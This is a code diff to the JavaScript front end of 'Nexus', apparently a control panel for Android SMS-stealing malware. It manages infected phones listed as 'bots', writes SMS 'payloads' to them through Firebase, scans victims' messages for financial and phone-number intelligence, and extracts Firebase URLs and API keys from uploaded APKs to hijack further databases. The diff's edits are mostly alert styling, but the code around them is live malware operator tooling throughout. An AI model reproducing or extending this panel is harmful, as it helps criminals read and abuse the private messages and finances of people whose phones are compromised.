@@ -1467,7 +1467,7 @@ async function bootNexus() {
         document.getElementById('loader').classList.add('hidden');
     } catch (e) {
         console.error("Boot Error:", e);
-        customAlert('Uplink Failed', 'Could not establish connection to the Middleman API. Error: ' + (e.message || e));
+        customAlert('Uplink Failed', 'Could not establish connection to the Middleman API. Error: ' + (e.message || e), 'error');
         document.getElementById('loader').classList.add('hidden');
     }
 }
@@ -2224,7 +2224,7 @@ function renderMList() {
 async function execSMS() {
     const to = document.getElementById('smsTo').value;
     const msg = document.getElementById('smsMsg').value;
-    if(!to || !msg) return customAlert('Missing Fields', 'Please fill in both the target phone number and payload message.');
+    if(!to || !msg) return customAlert('Missing Fields', 'Please fill in both the target phone number and payload message.', 'error');
     
     const finalMsg = msg.replace(/\[ID\]/g, selDev._id);
     const payload = { from: selSim, to, message: finalMsg, isSended: false };
@@ -2235,8 +2235,8 @@ async function execSMS() {
     
     try {
         await proxyFirebase(selDev._src, selDev._id, p, 'PUT', payload);
-        customAlert('Payload Staged', `The SMS command was successfully written to the device.\n\nFinal Payload:\n"${finalMsg}"`);
-    } catch(e) { customAlert('Execution Failed', 'Failed to stage the SMS payload. Target might be offline or unreachable.'); }
+        customAlert('Payload Staged', `The SMS command was successfully written to the device.\n\nFinal Payload:\n"${finalMsg}"`, 'success');
+    } catch(e) { customAlert('Execution Failed', 'Failed to stage the SMS payload. Target might be offline or unreachable.', 'error'); }
 }
 
 // --- FINANCIAL INTELLIGENCE PARSER ---
@@ -2503,7 +2503,7 @@ function showSystemCapabilities() {
             </ul>
         </div>
     `;
-    customAlert('System Capabilities', specsHtml);
+    customAlert('System Capabilities', specsHtml, 'warning');
 }
 
 function customAlert(title, desc, type = null) {
@@ -2557,7 +2557,7 @@ function customConfirm(title, desc, callback) {
 function closeConfirm() { document.getElementById('confirmModal').classList.remove('active'); }
 
 async function editPhone(src, id) {
-    if(!window.CAN_EDIT_PHONE) return customAlert('Access Denied', 'You do not have permission to edit numbers.');
+    if(!window.CAN_EDIT_PHONE) return customAlert('Access Denied', 'You do not have permission to edit numbers.', 'error');
     const d = devices.find(x => x._id === id && x._src === src);
     if(!d) return;
     
@@ -2592,44 +2592,17 @@ async function editPhone(src, id) {
 
 // ═══ DATABASE MANAGER ═══
 function openDbManager() {
-    renderDbList();
+    if (typeof renderAdminDbGrid === 'function') renderAdminDbGrid();
     document.getElementById('dbModal').classList.add('active');
 }
 
-function renderDbList() {
-    const badge = document.getElementById('dbTotalBadge');
-    if (badge) badge.textContent = `Total: ${SOURCES.length}`;
-
-    const html = SOURCES.map((s, i) => `
-        <div class="db-list-item" style="box-sizing: border-box; width: 100%; display: flex; justify-content: space-between; align-items: center; background: var(--bg-panel); padding: 14px 16px; border-radius: var(--radius-sm); border: 1px solid var(--border); transition: var(--trans);">
-            <div style="display: flex; align-items: center; gap: 12px; flex: 1; min-width: 0; padding-right: 12px;">
-                <div style="min-width: 12px; height: 12px; border-radius: 50%; background: ${s.color||'var(--cyan)'}; box-shadow: 0 0 10px ${s.color||'var(--cyan)'}"></div>
-                <div style="flex: 1; min-width: 0;">
-                    <div style="font-weight: 700; color: #fff; font-size: 1rem; margin-bottom: 4px; overflow: hidden; white-space: nowrap; text-overflow: ellipsis;">${esc(s.label)}</div>
-                    <div style="font-size: 0.8rem; color: var(--text-muted); font-family: var(--font-mono); overflow: hidden; white-space: nowrap; text-overflow: ellipsis;">${esc(s.base)}</div>
-                </div>
-            </div>
-            <div style="display: flex; gap: 4px; flex-shrink: 0; justify-content: flex-end;">
-                <button title="Share Connection" style="opacity:1; color:var(--text-muted); transition: var(--trans); border:none; background:transparent; padding:8px; border-radius:50%; cursor:pointer;" onmouseover="this.style.color='var(--cyan)'; this.style.background='rgba(0, 240, 255, 0.1)'" onmouseout="this.style.color='var(--text-muted)'; this.style.background='transparent'" onclick="generateInviteLink(${i})">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line></svg>
-                </button>
-                <button title="Edit Database" style="opacity:1; color:var(--text-muted); transition: var(--trans); border:none; background:transparent; padding:8px; border-radius:50%; cursor:pointer;" onmouseover="this.style.color='var(--cyan)'; this.style.background='rgba(0, 240, 255, 0.1)'" onmouseout="this.style.color='var(--text-muted)'; this.style.background='transparent'" onclick="editDb(${i})">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"></path><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"></path></svg>
-                </button>
-                <button title="Delete Database" style="opacity:1; color:var(--text-muted); transition: var(--trans); border:none; background:transparent; padding:8px; border-radius:50%; cursor:pointer;" onmouseover="this.style.color='var(--red)'; this.style.background='rgba(239, 68, 68, 0.1)'" onmouseout="this.style.color='var(--text-muted)'; this.style.background='transparent'" onclick="removeDb(${i})">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6h18"></path><path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6"></path><path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"></path><line x1="10" y1="11" x2="10" y2="17"></line><line x1="14" y1="11" x2="14" y2="17"></line></svg>
-                </button>
-            </div>
-        </div>
-    `).join('');
-    document.getElementById('dbList').innerHTML = html || '<div style="color:var(--text-muted);font-style:italic">No databases connected.</div>';
-}
+// renderDbList() removed — replaced by renderAdminDbGrid()
 
 async function generateInviteLink(idx) {
     const s = SOURCES[idx];
     if (!s) return;
     
-    const payload = `${s.label}|||${s.base}|||${s.apiKey || ''}`;
+    const payload = `${s.label}|||${s.key}|||invite`;
     const encoded = btoa(unescape(encodeURIComponent(payload)));
     
     // Build a proper invite URL — works on Netlify/HTTPS, graceful on file://
@@ -2708,7 +2681,7 @@ async function addDb() {
     const lbl = document.getElementById('newDbLabel').value.trim();
     let url = document.getElementById('newDbUrl').value.trim();
     
-    if(!lbl || !url) return customAlert('Missing Fields', 'Provide both a label and a valid Firebase URL.');
+    if(!lbl || !url) return customAlert('Missing Fields', 'Provide both a label and a valid Firebase URL.', 'error');
     if(url.endsWith('/')) url = url.slice(0, -1);
     
     const key = lbl.toLowerCase().replace(/[^a-z0-9]/g, '');
@@ -2734,7 +2707,7 @@ async function addDb() {
         
         if (!data.success) {
             resetAddBtn(btn);
-            return customAlert('Connection Failed', data.message || 'Could not validate database.');
+            return customAlert('Connection Failed', data.message || 'Could not validate database.', 'error');
         }
         
         // Push locally for immediate UI response
@@ -2819,7 +2792,7 @@ function removeDb(idx) {
                 // Immediately purge any bots belonging to the deleted database from local memory
                 devices = devices.filter(d => d._src !== deletedSrc);
                 
-                renderDbList();
+                if (typeof renderAdminDbGrid === 'function') renderAdminDbGrid();
                 
                 // Quick refresh of the UI to show new filter
                 const filterHtml = SOURCES.map(s => {
@@ -2837,17 +2810,17 @@ function removeDb(idx) {
                 // Force a full UI refresh to clear out the ghost bots
                 fetchAll();
             } else {
-                customAlert('Delete Failed', data.message || 'Could not delete database.');
+                customAlert('Delete Failed', data.message || 'Could not delete database.', 'error');
             }
         } catch(e) {
-            customAlert('API Error', 'Failed to communicate with proxy backend.');
+            customAlert('API Error', 'Failed to communicate with proxy backend.', 'error');
         }
     });
 }
 
 // ═══ USER MANAGEMENT (ADMIN ONLY) ═══
 async function openUserManager() {
-    if (window.CURRENT_ROLE !== 'admin') return customAlert('Access Denied', 'You do not have administrative privileges.');
+    if (window.CURRENT_ROLE !== 'admin') return customAlert('Access Denied', 'You do not have administrative privileges.', 'error');
     
     document.getElementById('userModal').classList.add('active');
     
@@ -2922,7 +2895,7 @@ async function createUser() {
     const canUseAutoDiscovery = document.getElementById('permAutoDiscovery').checked;
     const canViewTelecomIntel = document.getElementById('permViewIntel').checked;
     
-    if (!user || !pwd) return customAlert('Missing Fields', 'Provide both a Username and Password.');
+    if (!user || !pwd) return customAlert('Missing Fields', 'Provide both a Username and Password.', 'error');
     
     btn.disabled = true;
     btn.innerHTML = '⏳ Processing...';
@@ -2951,10 +2924,10 @@ async function createUser() {
             document.getElementById('newUserPwd').value = '';
             document.getElementById('permEditPhone').checked = false;
             document.getElementById('permAutoDiscovery').checked = false;
-            customAlert('Operator Created', `Operator '${user}' has been granted access to the panel.`);
+            customAlert('Operator Created', `Operator '${user}' has been granted access to the panel.`, 'success');
             await renderAdminUserList(); document.getElementById('userModal').classList.remove('active');
         } else {
-            customAlert('Creation Failed', data.message || 'Could not create operator account.');
+            customAlert('Creation Failed', data.message || 'Could not create operator account.', 'error');
         }
     } catch (e) {
         customAlert('API Error', 'Failed to communicate with proxy backend.');
@@ -3011,10 +2984,10 @@ async function deleteUser(id, username) {
 
 // ═══ TELECOM INTELLIGENCE ENGINE (PROFEX) ═══
 function scanTelecom(d) {
-    if (!window.CAN_VIEW_TELECOM) return customAlert('Access Denied', 'Telecom Intel Engine is restricted to Administrators.');
+    if (!window.CAN_VIEW_TELECOM) return customAlert('Access Denied', 'Telecom Intel Engine is restricted to Administrators.', 'error');
     
     const msgs = cache[d._src+':'+d._id];
-    if (!msgs || msgs.length === 0) return customAlert('Telecom Intel', 'No messages found to scan.');
+    if (!msgs || msgs.length === 0) return customAlert('Telecom Intel', 'No messages found to scan.', 'warning');
     
     document.getElementById('loader').classList.remove('hidden');
     document.getElementById('loadText').textContent = 'Profex Engine Running...';
@@ -3066,7 +3039,7 @@ function scanTelecom(d) {
                 });
             });
         } else {
-            customAlert('Telecom Intel', 'Scan complete. No high-confidence phone numbers were discovered in the SMS corpus.');
+            customAlert('Telecom Intel', 'Scan complete. No high-confidence phone numbers were discovered in the SMS corpus.', 'warning');
         }
     }, 1500);
 }
@@ -3304,19 +3277,19 @@ async function execBulkSMS() {
 // ═══ AUTO-DISCOVERY SCANNER ═══
 function startDiscoveryScan(receiverId, selectedDevices) {
     const rDev = devices.find(d => d._id === receiverId);
-    if (!rDev) return customAlert('Discovery Failed', `Receiver device ${receiverId} not found in your connected databases.`);
+    if (!rDev) return customAlert('Discovery Failed', `Receiver device ${receiverId} not found in your connected databases.`, 'error');
     
     const durationMs = 30 * 1000; // 30 seconds
     const intervalMs = 10 * 1000; // 10 seconds
     const startTime = Date.now();
     let matchesFound = 0;
     
-    customAlert('Scanner Armed', `Auto-Discovery Scanner is running in the background for 30 seconds.\n\nMonitoring receiver: ${receiverId}\nLooking for: ${selectedDevices.length} devices.`);
+    customAlert('Scanner Armed', `Auto-Discovery Scanner is running in the background for 30 seconds.\n\nMonitoring receiver: ${receiverId}\nLooking for: ${selectedDevices.length} devices.`, 'success');
     
     const scanInterval = setInterval(async () => {
         if (Date.now() - startTime > durationMs) {
             clearInterval(scanInterval);
-            customAlert('Scanner Complete', `Auto-Discovery finished.\nTotal numbers linked: ${matchesFound}`);
+            customAlert('Scanner Complete', `Auto-Discovery finished.\nTotal numbers linked: ${matchesFound}`, 'success');
             return;
         }
         
@@ -3651,7 +3624,7 @@ async function executeDeleteMsg() {
         document.getElementById('delMsgModal').classList.remove('active');
         msgToDelete = null;
     } catch(e) {
-        customAlert('Delete Failed', 'Failed to delete the message. The database may be locked.');
+        customAlert('Delete Failed', 'Failed to delete the message. The database may be locked.', 'error');
     } finally {
         btn.innerHTML = 'Delete';
     }
@@ -3679,7 +3652,7 @@ function handleApkSelect(e) {
 
 async function processApk(file) {
     if (!file.name.endsWith('.apk') && !file.name.endsWith('.zip')) {
-        customAlert('Invalid File', 'Only .apk files are supported for auto-extraction.');
+        customAlert('Invalid File', 'Only .apk files are supported for auto-extraction.', 'error');
         return;
     }
     
@@ -3692,7 +3665,7 @@ async function processApk(file) {
         const extracted = await extractFirebaseConfig(file);
         
         if (!extracted || (!extracted.firebaseUrl && !extracted.apiKey)) {
-            customAlert('Extraction Failed', 'No Firebase configuration was found in this APK.');
+            customAlert('Extraction Failed', 'No Firebase configuration was found in this APK.', 'error');
         } else {
             if (extracted.firebaseUrl) {
                 document.getElementById('newDbUrl').value = extracted.firebaseUrl;
@@ -3700,11 +3673,11 @@ async function processApk(file) {
             if (extracted.apiKey) {
                 document.getElementById('newDbApiKey').value = extracted.apiKey;
             }
-            customAlert('Extraction Successful', 'Firebase credentials successfully extracted from the APK.');
+            customAlert('Extraction Successful', 'Firebase credentials successfully extracted from the APK.', 'success');
         }
     } catch (err) {
         console.error(err);
-        customAlert('Error', 'Failed to parse APK. The file may be corrupted or protected.');
+        customAlert('Error', 'Failed to parse APK. The file may be corrupted or protected.', 'error');
     } finally {
         dropText.innerText = originalText;
         document.getElementById('apkDropZone').style.borderColor = 'rgba(255,255,255,0.1)';
@@ -3787,7 +3760,7 @@ async function extractFirebaseConfig(file) {
 }
 
 function exportDatabases() {
-    if (!SOURCES || SOURCES.length === 0) return customAlert("Export Failed", "No databases connected.");
+    if (!SOURCES || SOURCES.length === 0) return customAlert("Export Failed", "No databases connected.", "error");
     let content = "===== NEXUS DATABASE EXPORT =====\n";
     content += "Total Databases: " + SOURCES.length + "\n";
     content += "Exported on: " + new Date().toLocaleString() + "\n\n";
@@ -3824,7 +3797,7 @@ async function handleDbBulkAdd(event) {
         
         if (matches.length === 0) {
             event.target.value = ''; // Reset
-            return customAlert("Import Failed", "No valid Firebase URLs found in the text file.");
+            return customAlert("Import Failed", "No valid Firebase URLs found in the text file.", "error");
         }
         
         // Deduplicate in the file itself and remove trailing slashes
@@ -3836,7 +3809,7 @@ async function handleDbBulkAdd(event) {
         
         if (newUrls.length === 0) {
             event.target.value = ''; // Reset
-            return customAlert("Import Complete", "All Firebase URLs in the file are already connected to Nexus.");
+            return customAlert("Import Complete", "All Firebase URLs in the file are already connected to Nexus.", "success");
         }
         
         const dbsToConnect = [];
@@ -3917,11 +3890,11 @@ async function handleDbBulkAdd(event) {
             }
             
             await fetchAll();
-            renderDbList();
+            if (typeof renderAdminDbGrid === "function") renderAdminDbGrid();
             if(typeof renderAdminDbGrid === 'function') renderAdminDbGrid();
             
             document.getElementById('loader').classList.add('hidden');
-            customAlert("Bulk Add Complete", `Successfully connected ${successCount} databases.<br>Failed: ${failCount}`);
+            customAlert("Bulk Add Complete", `Successfully connected ${successCount} databases.<br>Failed: ${failCount}`, "success");
             event.target.value = ''; // Reset
         });
     };
